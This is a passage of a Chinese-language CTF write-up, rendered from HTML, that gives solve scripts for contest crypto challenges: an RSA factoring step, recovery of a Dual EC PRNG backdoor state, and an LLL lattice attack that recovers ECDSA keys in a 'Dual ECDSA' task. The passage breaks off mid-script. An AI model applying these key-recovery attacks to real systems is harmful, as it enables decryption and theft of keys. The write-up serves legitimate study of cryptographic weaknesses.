data-num=\"2\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">8086061902465799210233863613232941060876437002894022994953293934963170056653232109405937694010696299303888742108631749969054117542816358078039478109426</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> var<span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>solve<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n<span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span>q <span class=\"token operator\">==</span> <span class=\"token operator\">-</span>x<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>y<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"半决赛-dual-ecdsa\"><a class=\"markdownIt-Anchor\" href=\"#半决赛-dual-ecdsa\">#</a> 半决赛 - Dual ECDSA</h2>\n<p>看题目名就知道是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcHJpbnQuaWFjci5vcmcvMjAxNS83Njc=\"> Dual EC</span>，然后迅速找到了去年的 nepctf-badkey，先看看去年这题，了解一下这个后门的基本原理。实际上这个伪随机生成数的原理很容易理解，基本看图都能懂：</p>\n<p><img data-src=\"./%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/2902310-20231001222356724-1466661583.png\" alt=\"image\"><br>\nnep 这题的 adin 固定是 0，就相当于直接没有异或了，并且 r 的取值方式也没有像论文里丢掉一些比特，后面 <code> do_schnorr_identification</code>  一堆代码的唯一作用就是告诉我们加密 flag 的 key 是 r2，因此利用后门恢复一轮的递推就好了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>E<span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Q <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span><span class=\"token number\">48439561293906451759052585252797914202762949526041747995844080717082404635286</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">36134250956749795798585127919587881956611106672985015071877198253568414405109</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>r1 <span class=\"token operator\">=</span> <span class=\"token number\">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ct <span class=\"token operator\">=</span> <span class=\"token number\">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>P<span class=\"token operator\">=</span>d<span class=\"token operator\">*</span>Q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">do_next</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    sP <span class=\"token operator\">=</span> s <span class=\"token operator\">*</span> P</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    r <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span>sP<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    s_new <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>r <span class=\"token operator\">*</span> P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    rQ <span class=\"token operator\">=</span> r <span class=\"token operator\">*</span> Q</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> Integer<span class=\"token punctuation\">(</span>rQ<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s_new</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">do_guess</span><span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        rQ1 <span class=\"token operator\">=</span> E<span class=\"token punctuation\">.</span>lift_x<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    sP2 <span class=\"token operator\">=</span> d <span class=\"token operator\">*</span> rQ1</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    s2 <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span>sP2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    r2<span class=\"token punctuation\">,</span> s3 <span class=\"token operator\">=</span> do_next<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> r2<span class=\"token punctuation\">,</span> s3</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>r2<span class=\"token punctuation\">,</span>s3<span class=\"token operator\">=</span>do_guess<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r2<span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_flag</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    cipher <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    ct <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">return</span> ct</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ct <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>key<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">127452153710767463567686578700133367453</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>encrypt_flag<span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>蓝帽杯这题在套用基础的 Dual EC 的同时需要先用 LLL 去恢复 dsa 的私钥，然后利用基于中间相遇的 bsgs 去爆破一下私钥 n，因为是按照论文实现的后门所以随机数有损失 16 比特，所以还得再爆破一部分，具体过程有师傅写的很详细我就只贴个 exp 了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha256</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pub_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1284057549640164959065310299974715949780883842543987295579845101714329490371866414620403984059688256268916840753322634228189993387677187086805910608913877240</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2871828286437266324077547225563521746454811466060839307814808187038977339931268294634407454097422974392263009902452840007777204947601588882408605940896033213</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>P <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">44709432769601533647164055172337077577197388971405441067408648552120273899439</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5146142757398992761089276624845497246953677849813524410717292563307277646248</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Q <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">79560279623532866071675257110279687192436171302512534366260446974055296569775</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26859165885861631636190724510665269671005299628857498631278393159264950495322</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r1<span class=\"token punctuation\">,</span> s1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5089140070991418866765317340224488883853896999535207637664248575094162436344850602488004304731596114325990969313189073305315747359692187240695087335320008392</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2992276069467527712690275343211346442634209004250088074729707123246604474164141954635893526085370984681060737605953014207436859072640690696867665537702633916</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>r2<span class=\"token punctuation\">,</span> s2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2872033002190388322518484598506887434919678523735730644910370844671443735688758643453429779989693237887466003372385925789250465970691404896872113423303038969</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6723990832715616500336095376073676701350917549865164961917998759715703447465536431516566237824694270482046698060410301496792150963281602144685882679390639901</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>emb_flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3956409056364638168400543181298452742239103965766830338476029710731353557119679043260892196298159250455141959488613009091004454622819349680688797299967002549</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2951776604917486290836695572957027106817487586162444507028471362837490084205243361576174502575216282250806141358680269076670568688622463255476309019517775311</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># NIST P-256</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>NIST_256 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    NIST_256_P <span class=\"token operator\">:=</span> <span class=\"token number\">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    NIST_256_K <span class=\"token operator\">:=</span> GF<span class=\"token punctuation\">(</span>NIST_256_P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    NIST_256_A <span class=\"token operator\">:=</span> NIST_256_K<span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    NIST_256_B <span class=\"token operator\">:=</span> NIST_256_K<span class=\"token punctuation\">(</span><span class=\"token number\">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    NIST_256_CURVE <span class=\"token operator\">:=</span> EllipticCurve<span class=\"token punctuation\">(</span>NIST_256_K<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>NIST_256_A<span class=\"token punctuation\">,</span> NIST_256_B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    NIST_256_GEN <span class=\"token operator\">:=</span> NIST_256_CURVE<span class=\"token punctuation\">(</span><span class=\"token number\">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    NIST_256_ORDER <span class=\"token operator\">:=</span> <span class=\"token number\">0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>NIST_256_CURVE<span class=\"token punctuation\">.</span>set_order<span class=\"token punctuation\">(</span>NIST_256_ORDER<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># NIST P-521</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>NIST_521 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    NIST_521_P <span class=\"token operator\">:=</span> <span class=\"token number\">0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    NIST_521_K <span class=\"token operator\">:=</span> GF<span class=\"token punctuation\">(</span>NIST_521_P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    NIST_521_A <span class=\"token operator\">:=</span> NIST_521_K<span class=\"token punctuation\">(</span><span class=\"token number\">0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    NIST_521_B <span class=\"token operator\">:=</span> NIST_521_K<span class=\"token punctuation\">(</span><span class=\"token number\">0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    NIST_521_CURVE <span class=\"token operator\">:=</span> EllipticCurve<span class=\"token punctuation\">(</span>NIST_521_K<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>NIST_521_A<span class=\"token punctuation\">,</span> NIST_521_B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    NIST_521_GEN <span class=\"token operator\">:=</span> NIST_521_CURVE<span class=\"token punctuation\">(</span><span class=\"token number\">0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    NIST_521_ORDER <span class=\"token operator\">:=</span> <span class=\"token number\">0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span><span class=\"token string\">b\"AN INFAMOUS PRNG NAMED DUAL_EC BACKDOORED BY NSA, FINALLY CONFIRMED BY SNOWDEN IN 2013.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span><span class=\"token string\">b\"NO ONE CAN EXTRACT THE BACKDOOR! UNLESS YOU CAN BREAK THE ECDSA SIGNATURE SCHEME / ECDLP!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">512</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>ni <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>r1<span class=\"token operator\">*</span>s2<span class=\"token punctuation\">,</span> NIST_521_ORDER<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>L <span class=\"token operator\">=</span> matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> r2<span class=\"token operator\">*</span>s1<span class=\"token operator\">*</span>ni<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>               <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>e1<span class=\"token operator\">*</span>r2<span class=\"token operator\">-</span>e2<span class=\"token operator\">*</span>r1<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>ni<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>               <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> NIST_521_ORDER<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>basis <span class=\"token operator\">=</span> L<span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> basis<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">257</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">257</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            k1 <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            k2 <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>x1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>k1<span class=\"token operator\">*</span>s1<span class=\"token operator\">-</span>e1<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse_mod<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">,</span> NIST_521_ORDER<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>NIST_521_ORDER</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>x2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>k2<span class=\"token operator\">*</span>s2<span class=\"token operator\">-</span>e2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse_mod<span class=\"token punctuation\">(</span>r2<span class=\"token punctuation\">,</span> NIST_521_ORDER<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>NIST_521_ORDER</pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#d = 31415926535</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">18159149320158605242937658533192205255908256510625616254946992862480865015765341725</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>E <span class=\"token operator\">=</span> 